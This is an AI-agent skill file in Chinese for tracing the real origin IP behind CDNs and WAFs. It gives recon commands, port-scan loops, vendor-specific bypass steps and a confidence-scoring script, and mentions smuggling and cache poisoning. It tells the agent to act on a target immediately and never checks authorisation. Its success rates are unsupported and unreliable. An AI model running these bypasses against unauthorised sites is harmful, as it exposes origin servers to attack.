---
name: 云帷
description: Find real origin IP behind CDN/WAF using multi-method tracing.
version: 5.0.0
author: 大爱仙尊
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [cdn, origin, daaixianzun, pentest]
    category: daaixianzun
---
# CDN/WAF 真实IP溯源深度技能 (v5.0+ 深度强化版)

Find real origin IP behind CDN/WAF using multi-method tracing.

## 立刻跑

1. `NOW`: confirm task matches skill `cdn-origin-tracing`
2. `NOW`: if scope not built yet, read nine-stage-auto-router / attack-router first
3. `ACT`: follow workflow below; on new finding class, switch skill immediately

> **源自大爱仙尊九阶段融合技能集 · 域B (CDN/WAF溯源) 独立提取版**
>
> 包含完整的CDN溯源方法论，从基础DNS侦察到ML辅助溯源、暗网情报交叉验证、HTTP3 QUIC高级指纹等2026最新技术。
>
> **核心能力矩阵**:
> - 50种溯源方法分层组合拳 (成功率95%+)
> - 51家CDN厂商IP段数据库
> - 四维指纹验证体系 (Host头 + JA3/JA4 + HTTP/2 + 页面哈希)
> - 贝叶斯加权置信度评分
> - P0-P4优先级分层执行框架
> - 12家CDN厂商专项深度绕过 (Cloudflare/阿里云/腾讯云/AWS/Azure/华为云/网宿/百度云等)
> - 全网IP扫描溯源引擎 (ZMap/Masscan + 证书指纹匹配)
> - 2026新增: WebSocket溯源、gRPC/HTTP3指纹、ML辅助源站识别、暗网情报交叉、CDN缓存投毒+免杀部署
---
# Part I: CDN/WAF 溯源核心方法论 (v5.0)

> 源自 cdn-origin-tracing v5.0 · 50种溯源方法 · 51家CDN厂商 · 贝叶斯置信度评分

> 源自 cdn-origin-tracing v5.0 · 50种溯源方法 · 51家CDN厂商 · 贝叶斯置信度评分
---
## §9. 核心原则与分层流水线

**单方法成功率有限，分层组合拳成功率 95%+。**

```
第一层(发现)  crt.sh证书 → 子域名枚举(含AltDNS) → 历史DNS聚合 → 被动DNS多源交叉
第二层(暴露)  网络空间引擎(Shodan/Censys/FOFA) → CSP/CORS/JS端点 → 云存储桶枚举
第三层(触发)  邮件头/Pingback → 缓存投毒/请求走私 → SaaS/Serverless源站发现
第四层(验证)  Host头验证 → JA3/JA4 TLS指纹 → HTTP/2 Akamai指纹 → 页面哈希一致性
```

**v5.0关键升级**: 将"验证"独立成层，避免传统方法只发现不验证导致的误报。Host头返回200 ≠ 源站（可能是CDN节点或共享主机），必须用JA3/JA4 + HTTP/2指纹交叉确认。

### 9.1 一键全流程溯源

```bash
# 全流程: 识别CDN → 证书 → 子域名 → 被动DNS → 邮件 → 过滤 → Host验证 → TLS指纹 → 页面哈希 → 贝叶斯评分
python cdn_tracer.py target.com
# 输出: 终端彩色排名表 + report_target_com_<时间戳>.json

# 常用参数
python cdn_tracer.py target.com --threads 30        # 提高并发
python cdn_tracer.py target.com -o result.json      # 指定输出
python cdn_tracer.py target.com --no-verify         # 仅被动发现(不直连,隐蔽)
python cdn_tracer.py target.com --no-fingerprint     # 跳过TLS/哈希(加速)
```

### 9.2 CDN IP段过滤

```bash
python cdn_ranges.py 104.16.1.1           # → CDN: Cloudflare (AS13335)
python cdn_ranges.py --filter 1.2.3.4 104.16.1.1 8.8.8.8  # 批量过滤
python cdn_ranges.py --dump > cdn.json    # 导出全部IP段
```

### 9.3 深度IP段收集 (8源并发 · 52,108段)

```bash
python cdn_ip_collector.py                # 全量拉取: 8源 → 52,108段
python cdn_ip_collector.py --vendor Cloudflare,"阿里云 CDN"
python cdn_ip_collector.py --merge > all_cdn_ranges.txt
```
---
## §10. 50种溯源方法矩阵

| # | 方法 | 成功率 | 速度 | 自动化 | 关键工具 |
|---|------|--------|------|--------|----------|
| 1 | SSL证书透明度日志 | 85% | 秒级 | 是 | crt.sh, Censys, CertSpotter |
| 2 | 子域名枚举 | 80% | 分钟级 | 是 | Subfinder, Amass, OneForAll |
| 3 | 历史DNS记录 | 75% | 秒级 | 是 | SecurityTrails, VirusTotal |
| 4 | 网络空间搜索引擎 | 70% | 秒级 | 是 | Shodan, FOFA, ZoomEye, Censys |
| 5 | CNAME解析链追踪 | 70% | 秒级 | 是 | dig |
| 6 | CDN IP范围反查 | 65% | 分钟级 | 部分 | cdn_ranges.py, ASN |
| 7 | SPF邮件记录 | 60% | 秒级 | 是 | dig |
| 8 | MX邮件服务器关联 | 55% | 秒级 | 是 | dig MX |
| 9 | Host头验证 | 55% | 分钟级 | 是 | curl, httpx |
| 10 | 第三方服务ID关联 | 50% | 分钟级 | 否 | Google Analytics, 百度统计 |
| 11 | 网站功能泄露 | 50% | 分钟级 | 否 | RSS, robots.txt, sitemap |
| 12 | ICP备案查询 | 45% | 秒级 | 否 | beian.miit.gov.cn |
| 13 | XML-RPC Pingback泄露 | 40% | 秒级 | 是 | curl, nc |
| 14 | 邮件头分析 | 45% | 分钟级 | 否 | 邮件客户端 |
| 15 | Favicon哈希匹配 | 40% | 分钟级 | 部分 | Shodan, FOFA, mmh3 |
| 16 | DNS ANY/搜索引擎缓存 | 35% | 秒级 | 部分 | dig ANY, Wayback Machine |
| 17 | IPv6解析 | 25% | 秒级 | 是 | nslookup -type=AAAA |
| 18 | DNS区域传送 | 15% | 秒级 | 是 | dig AXFR |
| 19 | AltDNS排列+泛解析过滤 | 45% | 分钟级 | 是 | altdns, dnsgen |
| 20 | 多DNS解析器交叉验证 | 60% | 秒级 | 是 | dnsx, massdns |
| 21 | CSP/CORS头泄露 | 40% | 秒级 | 是 | curl |
| 22 | CDN回源IP段利用 | 55% | 分钟级 | 是 | CDN文档, nmap |
| 23 | JavaScript/API端点泄露 | 45% | 分钟级 | 半自动 | curl, grep |
| 24 | 被动DNS数据聚合 | 80% | 秒级 | 是 | 多源聚合 |
| 25 | 证书颁发机构分析 | 50% | 秒级 | 是 | crt.sh, openssl |
| 26 | HTTP重定向链分析 | 35% | 秒级 | 是 | curl -L |
| 27 | Cloudflare Tunnel绕过 | 35% | 分钟级 | 半自动 | dig, cloudflared配置 |
| 28 | Cloudflare Pages/Workers暴露 | 45% | 秒级 | 是 | crt.sh, *.pages.dev |
| 29 | Serverless/Lambda@Edge泄露 | 40% | 分钟级 | 半自动 | 日志触发, 错误页 |
| 30 | HTTP/3 (QUIC)源站发现 | 30% | 秒级 | 是 | curl --http3 |
| 31 | TLS 1.3 ECH/SNI操纵 | 25% | 秒级 | 是 | openssl, curl --doh-url |
| 32 | 容器/K8s Ingress暴露 | 40% | 分钟级 | 半自动 | Shodan, FOFA |
| 33 | CI/CD管道泄露 | 35% | 分钟级 | 是 | .git泄露, GitHub dork |
| 34 | 云存储桶枚举 | 50% | 分钟级 | 是 | lazarus, bucket_finder |
| 35 | WebSocket长连接源站 | 30% | 分钟级 | 是 | wscat, websocat |
| 36 | 缓存投毒/欺骗取源站 | 25% | 分钟级 | 半自动 | 路径操纵 |
| 37 | HTTP请求走私 | 20% | 分钟级 | 半自动 | smuggler, CL.TE/TE.CL |
| 38 | GraphQL Introspection泄露 | 35% | 秒级 | 是 | curl, graphw00f |
| 39 | SSE/Server-Sent Events源站 | 25% | 分钟级 | 是 | curl, EventSource |
| 40 | 移动App/小程序硬编码IP | 45% | 分钟级 | 是 | jadx, apktool, Frida |
| 41 | DNS Rebinding→SSRF | 40% | 分钟级 | 半自动 | singularity, rbndr |
| 42 | CDN缓存清除/预热回源泄露 | 35% | 分钟级 | 是 | CDN管理面板 |
| 43 | HTTP/2 HPACK压缩侧信道 | 25% | 分钟级 | 半自动 | h2load, h2spec |
| 44 | Anycast IP去匿名化 | 30% | 分钟级 | 是 | 多地ping, 全球VPS |
| 45 | CDN Origin Shield绕过 | 35% | 分钟级 | 半自动 | 请求路由操纵 |
| 46 | 速率限制差分分析 | 30% | 分钟级 | 半自动 | ffuf, 并发脚本 |
| 47 | eBPF/XDP源站旁路检测 | 20% | 分钟级 | 否 | bpftrace, cilium |
| 48 | 跨域资源计时侧信道 | 25% | 分钟级 | 半自动 | Performance API |
| 49 | 源站IP漂移实时追踪 | 50% | 分钟级 | 是 | cdn_ranges monitor |
| 50 | CDN回源认证绕过 | 30% | 分钟级 | 半自动 | Hashcat, 签名分析 |
---
## §11. 四维指纹验证体系 (v5.0核心)

### 11.1 JA3/JA4 TLS客户端指纹

```
原理: 每个TLS客户端(浏览器/服务器)有独特的JA3指纹，由以下字段MD5生成:
  - TLS Version
  - Cipher Suites (按顺序)
  - Extensions (按顺序)
  - Elliptic Curves
  - Elliptic Curve Point Formats

验证流程:
  1. 从CDN节点获取目标域名的JA3指纹
  2. 直接连接候选源站IP，获取其JA3指纹
  3. 如果JA3一致 → 强烈证据表明是同一后端
  4. JA4 (2024新版): 增加HTTP版本/ALPN/SNI等维度，更精确

工具:
  tshark -r capture.pcap -T fields -e tls.handshake.ja3
  python ja3extract.py --target origin_ip:443
```

### 11.2 HTTP/2 Akamai指纹

```
原理: HTTP/2连接建立时，服务端发送SETTINGS帧，包含:
  - SETTINGS_MAX_CONCURRENT_STREAMS
  - SETTINGS_INITIAL_WINDOW_SIZE
  - SETTINGS_MAX_FRAME_SIZE
  - SETTINGS_MAX_HEADER_LIST_SIZE
  - SETTINGS_ENABLE_PUSH

不同CDN/源站的SETTINGS组合不同，形成"HTTP/2指纹":
  Cloudflare: MAX_STREAMS=128, WINDOW=65536, PUSH=0
  Akamai:     MAX_STREAMS=100, WINDOW=2097152, PUSH=1
  自建Nginx:  MAX_STREAMS=128, WINDOW=65536, PUSH=1

验证: 直接连接候选源站 → 解析SETTINGS帧 → 与CDN节点对比
```

### 11.3 TCP/IP指纹

```
原理: 不同操作系统和内核版本的TCP/IP栈有不同特征:
  - TTL初始值 (Linux=64, Windows=128, Cisco=255)
  - TCP Window Size
  - TCP Options顺序和值 (MSS/SACK/Timestamp/WindowScale)
  - DF (Don't Fragment) 标志

用途: 区分CDN边缘节点(Linux)和源站(可能是Windows Server)
```

### 11.4 证书钉刺 (Certificate Pinning)

```
原理: 比较CDN返回的证书和源站直接返回的证书:
  - Subject Public Key Info (SPKI) 哈希
  - 证书链中的中间CA
  - 证书序列号
  - 证书有效期

验证: openssl s_client -connect origin_ip:443 | openssl x509 -noout -fingerprint
```

### 11.5 验证决策矩阵

| 指纹维度 | 匹配 | 不匹配 | 权重 |
|---------|------|--------|------|
| JA3/JA4 | 强证据(源站) | 排除(不同后端) | 35% |
| HTTP/2 SETTINGS | 强证据 | 弱排除 | 25% |
| TCP/IP | 中等证据 | 弱排除 | 20% |
| 证书SPKI | 决定性证据 | 排除 | 20% |
---
## §12. 贝叶斯加权置信度评分

### 12.1 证据分组与权重 (对数似然比LLR)

```python
# 6个独立维度的LLR值 (单位: logit)
LLR = {
    'A_cert':       {'hit': +2.5, 'miss': -1.0},  # 证书透明度
    'B_dns_history':{'hit': +2.0, 'miss': -0.8},  # 历史DNS
    'C_subdomain':  {'hit': +1.8, 'miss': -0.5},  # 子域名关联
    'D_mail':       {'hit': +1.5, 'miss': -0.3},  # 邮件头/SPF/MX
    'E_fingerprint':{'hit': +3.0, 'miss': -1.5},  # TLS/HTTP2指纹
    'F_space_engine':{'hit': +2.0, 'miss': -0.7},  # 网络空间引擎
}
PRIOR_LOGIT = -2.0  # 先验: 任意IP是源站的概率约12%
```

### 12.2 贝叶斯评分脚本

```python
import math

def score(ip, evidence):
    logit = PRIOR_LOGIT  # 先验概率
    details = []
    for dim, llr in LLR.items():
        hit = evidence.get(dim, False)
        delta = llr['hit'] if hit else llr['miss']
        logit += delta
        details.append(f"{dim}: {'HIT' if hit else 'miss'} ({delta:+.1f})")
    prob = 1 / (1 + math.exp(-logit))  # logit转概率
    return prob, details

# 判定阈值:
# P >= 0.95 → 几乎确定源站 → 直接确认
# 0.80 <= P < 0.95 → 高度疑似 → 补TLS/哈希指纹确认
# 0.50 <= P < 0.80 → 可疑 → 需Shodan/FOFA补证
# P < 0.50 → 排除
```

### 12.3 输出解读

```
排名  IP               置信度    TLS差异  哈希一致  判定
----------------------------------------------------------------------
1     203.0.113.5      97.3%     ✓        ✓        几乎确定源站   ← P≥0.95
2     198.51.100.10    84.2%     ✓        -        高度疑似源站   ← 补指纹确认
3     192.0.2.7        42.1%     -        -        可疑           ← 排除或补证

Top 1 证据:
  A_cert: ✓   B_dns_history: ✓   C_subdomain: ✓
  D_mail: ✗   E_fingerprint: ✓   F_space_engine: ✓
```
---
## §13. CDN厂商IP段数据库 (51家 · v5.0)

### 13.1 国际CDN厂商 (部分)

| CDN厂商 | ASN | 识别特征 |
|---------|-----|---------|
| Cloudflare | AS13335 | cf-ray, cf-cache-status, server: cloudflare |
| Amazon CloudFront | AS16509 | x-amz-cf-id, x-amz-cf-pop, via: CloudFront |
| Akamai | AS20940/AS16625 | X-Akamai-*, AkamaiGHost |
| Fastly | AS54113 | X-Served-By, X-Cache, via: Fastly |
| Google Cloud CDN | AS15169 | Server: Google Frontend, via: 1.1 google |
| Azure Front Door | AS8075 | x-azure-ref, Server: Microsoft-Azure |
| Imperva Incapsula | AS19551 | X-CDN, X-Iinfo, via: Imperva |
| Sucuri | AS399758 | X-Sucuri-ID, server: Sucuri/Cloudproxy |
| StackPath | AS33438 | X-StackPath-*, via: stackpath |
| BunnyCDN | AS200919 | X-BunnyCDN-*, server: BunnyCDN |

### 13.2 国内CDN厂商 (部分)

| CDN厂商 | ASN | 识别特征 |
|---------|-----|---------|
| 阿里云CDN | AS37963 | via: alicdn, server: Tengine |
| 腾讯云CDN/EdgeOne | AS45090/AS133478 | X-NWS-LOG-UUID, edgeone |
| 百度云加速 | AS38365 | Server: bfe, YJS-* |
| 又拍云 | AS48024 | X-Upyun-*, via: upyun |
| 七牛云 | AS9801/AS4812 | X-Qiniu-*, server: qiniu |
| 网宿 | AS4811/AS9801 | X-WS-*, via: wangsu |
| 华为云CDN | AS136990 | X-HW-*, server: hcdn |
| 火山引擎CDN | AS137673 | X-Volc-*, server: volc-cache |
| 金山云 | AS59019 | X-KSCDN-*, X-Cache |

### 13.3 深度收集 (8源并发)

| 源 | 覆盖 | 可靠性 |
|----|------|--------|
| Cloudflare ips-v4/v6 | CF边缘节点 | 官方, 最准 |
| AWS CloudFront JSON | CF全球边缘 | 官方, 最全 |
| Fastly public-ip-list | Fastly边缘 | 官方 |
| Azure ServiceTags | FrontDoor/CDN | 官方 |
| GCP Cloud IP Ranges | Google Cloud | 官方 |
| bgpview.io ASN | 所有40+ ASN | 第三方, 含历史 |
| RIPE Stat API | 所有40+ ASN | 权威, 当前BGP |
| RADB whois | 所有40+ ASN | 权威, 可能不全 |
---
## §14. 决策树与反规避

### 14.1 按目标画像选择溯源路径

```
目标画像判断:
  ├─ Cloudflare Tunnel (无A记录/无IP)
  │   └→ 方法27(cloudflared配置泄露) + 方法41(DNS Rebinding) + 方法28(Pages/Workers)
  ├─ 国内站 (ICP备案/国内CDN)
  │   └→ 方法12(ICP备案) + 方法34(云存储桶) + 方法20(多DNS交叉)
  ├─ AWS架构 (x-amz-cf-id)
  │   └→ 方法29(Serverless) + 方法34(S3桶) + 方法32(K8s Ingress)
  ├─ Serverless (无固定IP/函数计算)
  │   └→ 方法29(Lambda@Edge) + 方法43(HPACK侧信道) + 方法28(Workers)
  ├─ 容器/K8s (多端口/Ingress)
  │   └→ 方法32(K8s Ingress) + 方法4(Shodan端口扫描) + 方法33(CI/CD泄露)
  ├─ 移动App (API调用)
  │   └→ 方法40(硬编码IP) + 方法35(WebSocket) + 方法39(SSE)
  └─ WordPress (wp-content/pingback)
      └→ 方法13(Pingback) + 方法11(功能泄露) + 方法1(WP证书)
```

### 14.2 反规避与防御感知

```
防御机制识别:
  1. SNI过滤: 源站仅允许CDN回源IP + 特定SNI
     绕过: TLS 1.3 ECH + DoH + 直接IP连接(无SNI)
  2. 伪造CDN回源IP头: 源站伪造X-Forwarded-For
     绕过: 对比真实TCP连接IP与声称的回源IP
  3. IPv6绕过: CDN仅代理IPv4，源站有IPv6
     绕过: nslookup -type=AAAA target.com
  4. 地理围栏: 源站仅允许特定地区IP
     绕过: 全球VPS分布式探测

蜜罐识别清单:
  - 返回200但内容为空/默认页
  - 响应时间异常快(<10ms) → 可能是CDN缓存蜜罐
  - 证书CN与域名不匹配
  - HTTP/2 SETTINGS与声称的服务器不符
  - TTL值与声称的OS不匹配
```

### 14.3 持续监控与漂移检测

```bash
# 源站IP漂移检测
python cdn_origin_monitor.py target.com --interval 3600
# 检测: 新IP出现/旧IP消失/证书变更/DNS记录变化
```
---
## §14A. P0-P4 优先级分层执行框架 (v1.3 融合 FUCK-CDN)

> **融合 FUCK-CDN 的优先级分层 + 早停/晚停/死磕机制**，将50种方法重组为5个优先级梯队，实现 Token 最优 + 命中率最大化。

### 14A.1 优先级分层矩阵

| 优先级 | 方法类别 | Token成本 | 命中率 | 对应方法# | 说明 |
|--------|---------|-----------|--------|----------|------|
| **P0** | 快速低成本 | 极低 | 高 | #3,5,7,8,17,20 | DNS记录泄露、SPF/MX、历史DNS回溯、IPv6、多DNS交叉 |
| **P1** | 中等成本 | 中 | 中高 | #1,2,19,9,21,25,26 | SSL证书比对、子域名枚举、AltDNS、Host头、CSP/CORS、CA分析、重定向链 |
| **P2** | 较高成本 | 较高 | 中 | #4,15,6,24,10,11,12,34 | 空间搜索引擎、Favicon/Body Hash、CDN IP反查、被动DNS、GA ID、ICP备案、云存储桶 |
| **P3** | 高成本/手动 | 高 | 低 | #13,14,23,33,38,40,35,39,29,27,28 | 邮件触发、源码审计、JS端点、CI/CD、GraphQL、App硬编码、WebSocket、SSE、Serverless、CF Tunnel |
| **P4** | 深度挖掘 | 极高 | 不定 | 见§14E | Web考古、云元数据、WAF穿透、时间攻击、社工情报、拓扑推断、国际差异 |

### 14A.2 执行策略（早停/晚停/死磕）

```
┌──────────────────────────────────────────────────────────────────┐
│                    P0-P4 执行决策流程                              │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  P0 全部并行执行 (6种方法, 极低Token)                              │
│    ├─ 有候选IP? ──→ 进入验证阶段 (§11 四维指纹)                    │
│    └─ 无候选 ──→ 继续 P1                                          │
│                                                                  │
│  P1 全部并行执行 (7种方法, 中等Token)                              │
│    ├─ 有候选IP? ──→ 进入验证阶段                                   │
│    └─ 无候选 ──→ 继续 P2                                          │
│                                                                  │
│  P2 全部并行执行 (8种方法, 较高Token)                              │
│    ├─ 有候选IP? ──→ 进入验证阶段                                   │
│    └─ 无候选 ──→ 继续 P3                                          │
│                                                                  │
│  P3 逐个执行 (11种方法, 高Token, 手动辅助)                         │
│    ├─ 有候选IP? ──→ 进入验证阶段                                   │
│    └─ 无候选 ──→ 继续 P4                                          │
│                                                                  │
│  P4 深度挖掘 (9种非常规手段, 见§14E)                               │
│    ├─ 有候选IP? ──→ 进入验证阶段                                   │
│    └─ 仍无候选 ──→ 输出"未能确定"报告 + 后续建议                    │
│                                                                  │
│  ★ 早停机制: P0/P1 已有 2+ 独立来源交叉确认同一IP                   │
│    → 直接进入验证阶段, 不必穷尽 P2/P3                              │
│  ★ 晚停兜底: P2 仍无候选才执行全部 P3                              │
│  ★ 死磕到底: P0-P3 + CDN特定绕过 + 通用兜底全失败                   │
│    → 进入 P4 深度挖掘, 穷尽一切非常规手段                           │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 14A.3 P0 快速命中（必须全部并行执行）

```bash
# P0-1: SPF/MX/TXT 记录直接泄露
nslookup -type=TXT <root_domain>          # v=spf1 ip4:x.x.x.x → 源站IP
nslookup -type=MX <root_domain>           # 邮件服务器可能就是源站
nslookup -type=TXT _dmarc.<root_domain>   # DMARC报告地址
nslookup -type=TXT _spf.<root_domain>     # SPF子记录

# P0-2: IPv6 记录 (很多站只给IPv4接了CDN)
nslookup -type=AAAA <target>
nslookup -type=AAAA <root_domain>

# P0-3: 历史 DNS 回溯 (最高命中率)
#   ipchaxun.com / site.ip138.com / SecurityTrails API
#   找最早的A记录IP — 通常是CDN接入前的源站
#   找CDN启用时间拐点 — 拐点前后IP数量暴增

# P0-4: 基础DNS + CDN识别 (画像用)
nslookup <target>                        # CNAME链 → 识别CDN类型
nslookup -type=NS <root_domain>          # DNS托管商
nslookup -type=SOA <root_domain>         # 权威DNS

# P0-5: 多DNS解析器交叉验证
#   用8.8.8.8/1.1.1.1/114.114.114.114/208.67.222.222解析对比
#   不同解析器返回不同IP → CDN; 全部相同单IP → 可能无CDN

# P0-6: HTTP响应头泄露检测
curl -sI https://<target> | grep -iE "(x-real-ip|x-forwarded-for|x-origin-ip|x-backend-server|x-upstream-addr|x-served-by)"
# 这些头可能直接暴露源站IP（配置不当的CDN/反代）
```

**P0结果判断**: 有候选IP → 验证阶段 | 无候选 → 继续 P1

### 14A.4 证据分级标记

每个P0-P4步骤的发现必须标注证据强度：

| 等级 | 名称 | 典型证据 | 贝叶斯权重 |
|------|------|---------|-----------|
| **S** | 决定性 | SSL证书序列号匹配+默认证书不同+Server头差异 | 直接确认(P≥0.95) |
| **A** | 强佐证 | 历史DNS直接确认/IP反查绑定/空间引擎命中 | LLR +2.0~+3.0 |
| **B** | 佐证 | SPF包含/子域名解析/同C段关联/GA ID关联 | LLR +1.0~+1.8 |
| **C** | 弱线索 | 搜索引擎提及/同组织域名/JS端点 | LLR +0.3~+0.8 |
| **X** | 已排除 | 确认CDN节点/无关服务器/已下线 | LLR -1.0~-1.5 |
---
## §14B. CDN厂商专项深度绕过 (v1.3 新增 · 12家厂商)

> **融合 FUCK-CDN 的厂商特定绕过技术**，根据§14A的P0-4 CDN识别结果，执行对应厂商的专项绕过。

### 14B.1 Cloudflare 专项绕过

```bash
# 1. 非代理端口直达 (CF仅代理特定端口)
#    HTTP代理: 80,8080,8880,2052,2082,2086,2095
#    HTTPS代理: 443,2053,2083,2087,2096,8443
#    其他端口(21,22,25,8888,9090,3306,5432)不经过CF
for port in 21 22 25 8888 9090 3306 5432; do
  curl -sI -m 2 http://<target>:$port 2>&1 | head -3
done

# 2. CrimeFlare/CloudFlair 数据库查询
# WebSearch: "<root_domain>" site:crimeflare.org
# WebSearch: "<root_domain>" cloudflare bypass real IP

# 3. direct-connect 子域名探测
curl -sI "https://direct.<root_domain>"
curl -sI "https://direct-connect.<root_domain>"
curl -sI "https://origin.<root_domain>"

# 4. CF不代理非HTTP协议 (FTP/SSH/SMTP直达源站)
# 5. 老旧DNS记录 (CF接入前的A记录)
# 6. CF Partner CNAME接入泄露
# 7. Cloudflare Tunnel (cloudflared) 配置泄露 → 方法27
# 8. Cloudflare Pages/Workers/R2 源站暴露 → 方法28
# 9. CF Workers subrequest header 伪造 (X-Forwarded-For)
```

### 14B.2 腾讯 EdgeOne 专项绕过

```bash
# 特征: CNAME *.eo.dnse5.com, Server: TencentEdgeOne
# HTTP 567 = WAF拦截, HTTP 418 = 无匹配域名

# 1. 网络层保护绕过: 直连源站IP+Host头可能仍被拦截(返回567)
#    判定: IP对域名返回567但直连返回nginx/apache → 这是源站
# 2. 源站通常在腾讯云CVM
#    常见网段: 101.32-35.x.x, 43.x.x.x, 49.x.x.x, 118.x.x.x, 129.x.x.x
#    历史+IP反查在这些段内 → 重点验证
# 3. EdgeOne SSL证书由EdgeOne管理, 源站可能部署相同证书(自动同步)
# 4. EdgeOne回源IP段可枚举 (查腾讯云文档)
# 5. EdgeOne边缘函数(EIF)日志泄露
```

### 14B.3 阿里云 CDN/DCDN 专项绕过

```bash
# 特征: CNAME *.cdngslb.com / *.alikunlun.com / *.tbcache.com
# 响应头: Server: Tengine, EagleId, Via: cache*.cn

# 1. 回源Host配置差异: 回源Host≠加速域名时, 用回源Host访问源站IP可绕过
# 2. 源站通常在ECS
#    常见网段: 47.x.x.x, 39.x.x.x, 120.x.x.x, 121.x.x.x, 106.x.x.x
# 3. OSS Bucket源站: CNAME含oss-cn-*.aliyuncs.com → 源站是OSS(非传统服务器)
# 4. 函数计算/Serverless源站: FC无固定IP, 需用方法29
# 5. DCDN的WebSocket配置泄露: 检查ws://连接是否绕过DCDN
# 6. 阿里云HTTPDNS (203.107.1.0/24) 探测
```

### 14B.4 AWS CloudFront 专项绕过

```bash
# 特征: CNAME *.cloudfront.net, Via: *.cloudfront.net, X-Amz-Cf-*

# 1. CloudFront仅代理HTTP/HTTPS, SSH/FTP/其他端口不代理
# 2. S3 Bucket源站: <bucket>.s3.amazonaws.com → 直接访问S3 endpoint
# 3. ALB/ELB源站: DNS枚举可能找到直接的ALB域名
# 4. AWS IP段筛选: https://ip-ranges.amazonaws.com/ip-ranges.json
#    筛选service=EC2的段缩小范围
# 5. 旧SSL证书可能在ACM中有记录
# 6. Lambda@Edge源站: 查CloudFront分布日志
# 7. CloudFront Origin Access Identity (OAI) 绕过
```

### 14B.5 Azure CDN/Front Door 专项绕过

```bash
# 特征: CNAME *.azureedge.net / *.azurefd.net, X-Azure-Ref

# 1. Azure源站在Azure VM: *.cloudapp.azure.com
# 2. Front Door后端池探测: health probe路径暴露后端信息
# 3. 非标准端口不代理
# 4. Azure ServiceTags IP段筛选
# 5. App Service源站: *.azurewebsites.net (可能未接CDN)
# 6. Front Door routing rule配置不一致
```

### 14B.6 Akamai 专项绕过

```bash
# 特征: CNAME *.akamaiedge.net / *.akamai.net, X-Akamai-*

# 1. SureRoute Test Object: /_akamai/sureroute-test-object.html
# 2. Akamai Ghost头 (Pragma调试):
curl -sI -H "Pragma: akamai-x-cache-on, akamai-x-get-true-cache-key, akamai-x-check-cacheable, akamai-x-get-extracted-values" https://<target>
# 3. Akamai staging网络: *.akamaiedge-staging.net → 调试信息
# 4. Akamai EdgeWorker日志泄露
# 5. Origin Shield绕过: 请求路由操纵
```

### 14B.7 Fastly 专项绕过

```bash
# 特征: CNAME *.fastly.net, X-Fastly-Request-ID, X-Served-By

# 1. Fastly使用Anycast, 所有节点共享IP池 (nslookup返回少量固定IP)
# 2. X-Served-By头泄露cache节点信息
# 3. Fastly Shield配置暴露源站区域
# 4. Fastly VCL配置泄露 (错误页面)
# 5. Fastly Compute@Edge (WASM) 日志
```

### 14B.8 Imperva/Incapsula 专项绕过

```bash
# 特征: CNAME *.incapdns.net, X-CDN: Incapsula, X-Iinfo

# 1. 回源可能不验证Host → 直接IP访问返回源站内容
# 2. X-Iinfo头包含session信息, 可能泄露源站标识
# 3. Incapsula仅代理80和443 → 非标准端口直达
# 4. Imperva Cloud WAF规则差异测试
```

### 14B.9 Sucuri WAF 专项绕过

```bash
# 特征: CNAME *.sucuri.net, X-Sucuri-*

# 1. Firewall通常只代理80/443 → 非标准端口直达源站
# 2. Sucuri接入前的DNS记录通常就是源站IP
# 3. X-Sucuri-Cache头分析
# 4. Sucuri代理IP段固定, 可精确排除
```

### 14B.10 华为云 CDN 专项绕过

```bash
# 特征: CNAME *.cdnhwc*.com, X-HW-*

# 1. 源站通常在华为云ECS → 历史+IP反查确认
# 2. X-HW-Via调试头包含节点信息
# 3. 华为云CDN回源IP段可枚举
# 4. WAF规则差异: HTTP方法/路径混淆
```

### 14B.11 网宿 CDN 专项绕过

```bash
# 特征: CNAME *.wscloudcdn.com / *.ourwebpic.com, X-Ws-Request-Id

# 1. 国内老牌CDN, 早期配置可能有缺陷
# 2. 网宿节点IP通常在运营商网段
# 3. 历史DNS回溯效果好
# 4. 网宿WSA API接口泄露
```

### 14B.12 百度云 CDN 专项绕过

```bash
# 特征: CNAME *.baidustatic.com / *.bdydns.com / *.bcebos.com

# 1. BCH(百度云虚机)源站探测
# 2. BOS(百度对象存储)源站: 直接访问BOS endpoint
# 3. 百度云加速历史DNS泄露率较高
# 4. 百度智能云IP段: 180.76.x.x, 182.61.x.x, 106.38.x.x
```
---
## §14C. 通用CDN兜底策略 (v1.3 新增)

> 当CNAME/响应头无法匹配任何已知厂商时执行。

### 14C.1 CDN类型识别三步法

```bash
# 步骤1: CNAME链追踪
nslookup -type=CNAME <target>
# 将末端域名WebSearch确认是哪家CDN

# 步骤2: HTTP响应头指纹采集
curl -sI https://<target> | grep -iE "^(Server|Via|X-CDN|X-Cache|X-Served-By|X-Edge|CF-RAY|X-Amz|X-HW|X-Swift|X-Varnish|Powered-By):"

# 步骤3: IP归属ASN查询
curl -s "https://ipinfo.io/<cdn_node_ip>/json" | grep -E "(org|asn)"
# ASN名称通常直接包含CDN厂商名
```

### 14C.2 通用绕过五步法

```bash
# 1. 非标准端口扫描 (绝大多数CDN只代理80/443)
for port in 21 22 25 81 888 2222 3000 3306 4443 5432 5900 6379 8000 8080 8443 8888 9090 9443; do
  result=$(curl -sI -m 2 http://<target>:$port 2>&1 | head -3)
  [ -n "$result" ] && echo "Port $port: $result"
done

# 2. 直接IP访问行为差异
#    CDN节点: 返回403/421/418/502或CDN自定义错误
#    源站: 返回200/301/nginx-apache默认页
curl -sI -k https://<candidate_ip>
curl -sI http://<candidate_ip>

# 3. 协议层绕过 (CDN不代理SSH/FTP/SMTP)
timeout 3 bash -c "echo | curl -s -m 3 telnet://<candidate_ip>:22" 2>&1 | head -1
timeout 3 bash -c "echo | curl -s -m 3 telnet://<candidate_ip>:21" 2>&1 | head -1

# 4. EDNS Client Subnet绕过
dig +subnet=0.0.0.0/0 <target> @8.8.8.8

# 5. HTTP vs HTTPS差异
#    某些小众CDN仅保护主域名, www/子域名可能未接入
#    或CDN仅覆盖HTTPS而HTTP直连源站
curl -sI http://<target>     # HTTP可能未走CDN
curl -sI https://<target>    # HTTPS走CDN
# 对比两者Server头和响应IP
```
---
## §14D. P4 深度挖掘九大技术 (v1.3 新增 · 融合 FUCK-CDN)

> **触发条件**: P0-P3 通用方法 + CDN特定绕过(§14B) + 通用兜底(§14C) 均未产出可验证候选IP。进入此阶段意味着目标防护极强，需要动用一切非常规手段。

### 14D.1 Web Archive 时间线考古

```bash
# 1. Wayback Machine CDX API (历史快照)
